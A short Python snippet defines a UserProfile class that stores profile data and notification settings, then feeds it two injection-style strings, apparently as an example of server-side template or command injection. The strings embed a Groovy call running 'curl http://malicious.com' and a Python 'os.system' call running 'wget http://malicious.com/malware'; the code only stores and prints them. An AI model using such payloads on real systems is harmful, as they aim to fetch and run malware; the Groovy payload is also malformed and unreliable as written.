class UserProfile:
    def __init__(self, username):
        self.username = username
        self.profile_data = {}
        self.notifications_settings = {}

    def edit_profile(self, new_data):
        self.profile_data = new_data

    def edit_notifications(self, new_settings):
        self.notifications_settings = new_settings

user = UserProfile("example_user")
user.edit_profile("{{groovy: new java.lang.Runtime().exec('curl http://malicious.com')}}")
user.edit_notifications("{{python: os.system('wget http://malicious.com/malware')}}")

print(user.profile_data)
print(user.notifications_settings)